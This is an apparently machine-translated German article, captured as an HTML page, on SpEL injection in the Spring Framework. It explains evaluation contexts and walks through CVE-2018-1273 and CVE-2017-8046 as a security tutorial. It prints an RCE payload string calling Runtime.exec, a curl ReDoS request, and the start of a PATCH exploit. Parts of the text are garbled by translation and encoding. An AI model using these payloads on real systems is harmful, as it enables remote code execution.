<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üóø üéø ü¶ä Spel-Injektion üë®üèΩ‚Äçüíº ‚åöÔ∏è üà¥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 


 W√§hrend wir an verschiedenen Diensten arbeiten und diese erforschen, k√∂nnen wir zunehmend den Fr√ºhlingsrahmen erf√ºllen. Der logische Schritt...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Spel-Injektion</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Intro </h1><br><p>  W√§hrend wir an verschiedenen Diensten arbeiten und diese erforschen, k√∂nnen wir zunehmend den Fr√ºhlingsrahmen erf√ºllen.  Der logische Schritt besteht darin, sich mit seiner Struktur und m√∂glichen Schwachstellen vertraut zu machen. </p><br><p>  Die interessantesten f√ºr jeden Pentester sind Schwachstellen, die zur Codeausf√ºhrung f√ºhren. </p><br><p>  Eine M√∂glichkeit, RCE im Fr√ºhjahr zu erhalten, besteht darin, SpEL-Ausdr√ºcke einzuf√ºgen. </p><br><p>  In diesem Artikel werden wir versuchen zu verstehen, was SpEL ist, wo es zu finden ist, welche Verwendungsmerkmale es gibt und wie solche Injektionen zu finden sind. </p><a name="habracut"></a><br><h1 id="what">  Was? </h1><br><p>  <strong>SpEL</strong> ist eine Ausdruckssprache, die f√ºr das Spring Framework erstellt wurde und die Abfrage und Diagrammverwaltung von Objekten zur Laufzeit unterst√ºtzt. <br>  Es ist auch wichtig zu beachten, dass SpEL als API erstellt wurde, mit der Sie es in andere Anwendungen und Frameworks integrieren k√∂nnen. </p><br><h1 id="gde-mozhno-vstretit">  Wo kann ich mich treffen? </h1><br><p>  Es ist logisch, dass im <strong>Spring Framework</strong> SpEL st√§ndig verwendet wird.  Ein gutes Beispiel ist Spring Security, bei dem Rechte mithilfe von SpEL-Ausdr√ºcken zugewiesen werden: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel verwendet die SpEL-API.  Unten finden Sie Beispiele aus der Dokumentation. <br>  Buchstabenbildung mit SpEL-Ausdr√ºcken: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Oder Sie k√∂nnen eine Regel aus einer externen Datei verwenden, um beispielsweise einen Header anzugeben: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Hier sind einige Beispiele auf GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring Framework und SpEL Basics </h1><br><p>  Um dem Leser das Verst√§ndnis der SpEL-Injektionen zu erleichtern, m√ºssen Sie Spring und SpEL ein wenig kennenlernen. </p><br><p>  Ein Schl√ºsselelement des Spring Framework ist der Spring Container.  Ein Container erstellt Objekte, bindet sie zusammen, konfiguriert und verwaltet sie von der Erstellung bis zur Zerst√∂rung. </p><br><p>  Zur Steuerung der Komponenten, aus denen die Anwendung besteht, verwendet Spring Container <br>  Abh√§ngigkeitsinjektion.  In diesem Fall werden Objekte mithilfe externer Entit√§ten konfiguriert, die als Spring Beans bezeichnet werden - umgangssprachlich als "Beans" bezeichnet. </p><br><p>  Spring Container ruft die Konfigurationsmetadaten aus der Bean ab, die zum Abrufen der folgenden Informationen erforderlich sind: Anweisungen dazu, welche Objekte instanziiert werden sollen und wie sie √ºber Metadaten konfiguriert werden. </p><br><p>  Metadaten k√∂nnen auf drei Arten abgerufen werden: </p><br><ul><li>  XML </li><li>  Java-Anmerkungen </li><li>  Java-Code </li></ul><br><p>  Ein weiterer wichtiger Punkt f√ºr uns ist der Anwendungskontext. </p><br><p>  <strong>ApplicationContext</strong> ist die Hauptschnittstelle in einer Spring-Anwendung, die Informationen zur Anwendungskonfiguration bereitstellt.  Es ist zur Laufzeit schreibgesch√ºtzt, kann jedoch bei Bedarf neu geladen und von der Anwendung unterst√ºtzt werden.  Die Anzahl der Klassen, die die ApplicationContext-Schnittstelle implementieren, ist f√ºr verschiedene Konfigurationsparameter und Anwendungstypen verf√ºgbar.  In der Tat ist es die Spring-Anwendung selbst.  Der Kontext bietet auch die M√∂glichkeit, auf verschiedene Ereignisse in der Anwendung zu reagieren und den Lebenszyklus der Beans zu steuern. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Lassen Sie uns nun direkt auf die Methoden zum Definieren einer Bean und zum Verwenden von SpEL-Ausdr√ºcken eingehen. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Ein Beispiel f√ºr eine typische Verwendung ist die Integration von SpEL in die Erstellung von XML- oder kommentierten Definitionen von Bean-Komponenten: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äúexmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Hier ist ein Teil des Codes in der Bean.xml-Datei f√ºr nur eine der Beans.  Es lohnt sich, auf die ID des Fachs zu achten, auf das zugegriffen werden kann, und auf die Eigenschaften.  Weil  Als Teil dieses Artikels erw√§gen wir die Verwendung von SpEL. Im Beispiel werden dann mehrere Optionen zum Schreiben solcher Ausdr√ºcke angegeben. </p><br><p>  Um Spring anzuzeigen, dass SpEL-Ausdr√ºcke als N√§chstes kommen, wird das Zeichen # verwendet und der Ausdruck selbst in geschweiften Klammern angegeben: <code>#{SpEL_expression}</code> .  Auf Eigenschaften kann mit dem Zeichen $ verwiesen werden, wobei der Eigenschaftsname in geschweiften Klammern angegeben wird: <code>${someProperty}</code> .  Eigenschaftsplatzhalter k√∂nnen keine SpEL-Ausdr√ºcke enthalten, aber Ausdr√ºcke k√∂nnen Eigenschaftsreferenzen enthalten: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  So k√∂nnen Sie jede ben√∂tigte Java-Klasse aufrufen oder beispielsweise auf Umgebungsvariablen zugreifen, die zur Ermittlung des Benutzernamens oder der Version des Systems hilfreich sein k√∂nnen. </p><br><p>  Der Vorteil dieser Methode zum Angeben von Beans besteht darin, dass sie ge√§ndert werden k√∂nnen, ohne dass die gesamte Anwendung neu kompiliert werden muss, wodurch sich das Verhalten der Anwendung √§ndert. </p><br><p>  √úber die Anwendung selbst k√∂nnen Sie √ºber die ApplicationContext-Schnittstelle auf diese Bean zugreifen, wie unten gezeigt: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(‚ÄúBean.xml‚Äù); MyExpression example = ctx.getBean(‚Äúexample<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(‚ÄúNumber : "</span></span> + example.getValue()); System.out.println(‚ÄúLocale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(‚ÄúLocale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  Das hei√üt,  Innerhalb der Anwendung erhalten wir einfach die Werte der bin-Parameter, die SpEL-Ausdr√ºcke enthalten.  Nachdem Spring einen solchen Wert erhalten hat, f√ºhrt er den Ausdruck aus und gibt das Endergebnis zur√ºck.  Vergessen Sie auch nicht, dass dieser Code ohne die entsprechenden Getter nicht funktioniert, aber ihre Beschreibung geht √ºber den Rahmen des Artikels hinaus. </p><br><p>  Eine andere M√∂glichkeit, Beans anzugeben, ist die AnnotationBase-Annotationsmethode. Parameterwerte werden f√ºr einige Klassen in der Annotation festgelegt.  In diesem Fall ist die Verwendung von Variablen nicht m√∂glich. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Um Variablen verwenden zu k√∂nnen, m√ºssen wir beim Erstellen von SpEL-Ausdr√ºcken die ExpressionParser-Schnittstelle verwenden.  Anschlie√üend wird im Anwendungscode eine Klasse angezeigt, √§hnlich dem folgenden Beispiel: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser konvertiert einen Zeichenfolgenausdruck in ein Expression-Objekt.  Somit kann der Wert des analysierten Ausdrucks im Rahmen des EvaluationContext erhalten werden.  Dieser EvaluationContext ist das einzige Objekt, f√ºr das alle Eigenschaften und Variablen in der EL-Zeichenfolge verf√ºgbar sind. </p><br><p>  Es ist erw√§hnenswert, eine weitere wichtige Tatsache.  Bei dieser Methode zur Verwendung von SpEL muss der Zeichenfolgenausdruck nur # enthalten, wenn er zus√§tzlich zum Ausdruck selbst Zeichenfolgenliterale enth√§lt. </p><br><p>  Von alledem lohnt es sich, sich an zwei Dinge zu erinnern: <br>  1) Wenn es m√∂glich ist, nach Anwendungscode zu suchen, m√ºssen Sie nach solchen Schl√ºsselw√∂rtern suchen: SpelExpressionParser, EvaluationContext und parseExpression. <br>  2) F√ºr Spring <code>#{SpEL}</code> , <code>${someProperty}</code> und <code>T(javaclass)</code> wichtige Zeiger <br>  Wenn Sie mehr √ºber Spring und SpEL erfahren m√∂chten, empfehlen wir Ihnen, die Dokumentation zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">docs.spring.io</a> zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">beachten</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  Was kann SpEL tun? </h1><br><p>  Laut Dokumentation unterst√ºtzt SpEL die folgenden Funktionen: </p><br><ul><li>  W√∂rtliche Ausdr√ºcke </li><li>  Boolesche und relationale Operatoren </li><li>  Regul√§re Ausdr√ºcke </li><li>  Klassenausdr√ºcke </li><li>  Zugriff auf Eigenschaften, Arrays, Listen, Karten </li><li>  Methodenaufruf </li><li>  Vergleichsoperatoren </li><li>  Zuordnung </li><li>  Konstruktoren aufrufen </li><li>  Bean Referenzen </li><li>  Array-Konstruktion </li><li>  Inline-Listen </li><li>  Inline-Karten </li><li>  Tern√§rer Operator </li><li>  Variablen </li><li>  Benutzerdefinierte Funktionen </li><li>  Sammlungsprojektion </li><li>  Sammlungsauswahl </li><li>  Vorlagenausdr√ºcke </li></ul><br><p>  Wie wir sehen k√∂nnen, ist die SpEL-Funktionalit√§t sehr umfangreich, und dies kann die Sicherheit des Projekts beeintr√§chtigen, wenn Benutzereingaben in ExpressionParser eingehen.  Daher empfiehlt Spring selbst, anstelle eines voll funktionsf√§higen StandardEcalutionContext einen abgespeckten SimpleEvaluationContext zu verwenden. </p><br><p>  Kurz gesagt, SimpleEvaluationContext ist f√ºr uns nicht wichtig und kann nicht auf Java-Klassen zugreifen und auf andere Beans verweisen. </p><br><p>  Eine vollst√§ndige Beschreibung der Funktionen finden Sie am besten auf der Dokumentationswebsite: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Einige Korrekturen basieren sogar auf dem Unterschied in der Funktionalit√§t von SpEL, das in verschiedenen Kontexten ausgef√ºhrt wird. Wir werden jedoch etwas sp√§ter darauf eingehen. </p><br><p>  Um alles wirklich klar zu machen, geben wir ein Beispiel.  Wir haben eine eindeutig b√∂swillige Zeile, die einen SpEL-Ausdruck enth√§lt: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Und es gibt zwei Kontexte: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  und </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Ausdruck exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>Der Rechner wird gestartet</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>Wir erhalten eine Fehlermeldung</strong> </p><br><p>  Ein ebenso interessanter Punkt ist, dass wir mit der Verarbeitung des Ausdrucks beginnen k√∂nnen, ohne einen Kontext anzugeben: <code>exp.getValue();</code> <br>  In diesem Fall wird der Ausdruck im Standardkontext ausgef√ºhrt und der b√∂sartige Code wird ausgef√ºhrt.  Wenn Sie ein Programmierer sind und Spring verwenden, vergessen Sie daher niemals, den Kontext festzulegen, in dem der Ausdruck ausgef√ºhrt werden soll. </p><br><p>  Wir haben etwas fr√ºher gesagt, dass einige Korrekturen auf den Unterschieden zwischen den SpEL-Funktionen innerhalb von Kontexten beruhen.  Betrachten Sie ein Beispiel f√ºr eine solche Korrektur. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Diese Sicherheitsanf√§lligkeit wurde in der Methode setPropertyValue gefunden und basierte auf zwei Problemen: <br>  1) Unzureichende Bereinigung der Werte der Variablen, die in ExpressionParser fallen. <br>  2) Ausf√ºhrung des Ausdrucks im Rahmen des Standardkontexts. </p><br><p>  Hier ist ein Screenshot des anf√§lligen Teils des Codes: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Weil  Der Eigenschaftsname erforderte keine komplexe Verarbeitung innerhalb des SpEL-Frameworks. Die logische L√∂sung bestand darin, den Kontext zu ersetzen, was zu folgendem Code f√ºhrte: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Die Screenshots zeigen die Teile des Codes, die den Kontext festlegen, und den Ausdruck, der ausgef√ºhrt wird.  Die Ausf√ºhrung des Ausdrucks erfolgt jedoch an anderer Stelle: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  Hier wird angezeigt, dass wir einen SpEL-Ausdruck f√ºr den Wert im angegebenen Kontext ausf√ºhren. <br>  Die Verwendung von SimpleEvaluationContext hat zum Schutz vor der Implementierung der Java-Klasse in parseExpression beigetragen. Anstatt jetzt Code im Serverprotokoll auszuf√ºhren, wird ein Fehler angezeigt: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Dies l√∂ste jedoch nicht das Problem mit dem Mangel an ausreichenden sanit√§ren Einrichtungen und behielt die F√§higkeit bei, einen Redos-Angriff durchzuf√ºhren: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Daher beinhaltete der n√§chste Fix bereits die Bereinigung des Parameternamens. </p><br><h1 id="ot-teorii-k-praktike">  Von der Theorie zur Praxis! </h1><br><p>  Schauen wir uns nun verschiedene M√∂glichkeiten an, um mithilfe der White-Box-Methode nach SpEL-Injektionen zu suchen. </p><br><h2 id="step-by-step-cve-2017-8046">  Schritt f√ºr Schritt CVE-2017-8046 </h2><br><p>  Zuerst m√ºssen Sie einen Ort f√ºr die Verarbeitung von SpEL-Ausdr√ºcken finden.  Dazu k√∂nnen Sie einfach unsere Empfehlung verwenden und Stichw√∂rter im Code finden.  Erinnern Sie sich an diese W√∂rter: SpelExpressionParser, EvaluationContext und parseExpression. </p><br><p>  Eine andere M√∂glichkeit besteht darin, verschiedene Plugins zu verwenden, um Fehler im Code zu finden.  Bisher war findsecbugs-cli das einzige Plugin, das auf eine m√∂gliche SpEL-Injektion hinweist. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Also haben wir den Ort gefunden, an dem wir uns f√ºr den Code interessieren.  Angenommen, wir verwenden findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  Im Anwendungscode sehen wir Folgendes: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  Der n√§chste Schritt besteht darin, herauszufinden, wo die Pfadvariable in den Ausdrucksparser gelangt.  Eine der bequemsten und kostenlossten M√∂glichkeiten w√§re die Verwendung der IntelijIdea IDE-Funktion - Datenfluss analysieren: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Durch Abwickeln der Kette, zum Beispiel zum Ersetzen und Studieren der angegebenen Methoden und Klassen, erhalten wir Folgendes: </p><br><p>  Die ReplaceOperation-Methode √ºbernimmt den Wert der Pfadvariablen. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Um die Ersetzungsmethode aufzurufen, m√ºssen Sie die Variable "op" mit dem Wert "replace" an JSON √ºbergeben. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Ebenso finden wir alle Stellen, an denen der Benutzer den von ihm ben√∂tigten Wert an die Pfadvariable √ºbergeben kann.  Und dann sieht eine der Ausnutzungsoptionen f√ºr die Sicherheitsanf√§lligkeit folgenderma√üen aus: <br>  Anforderungsmethode: PATCH <br>  Text anfordern: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span 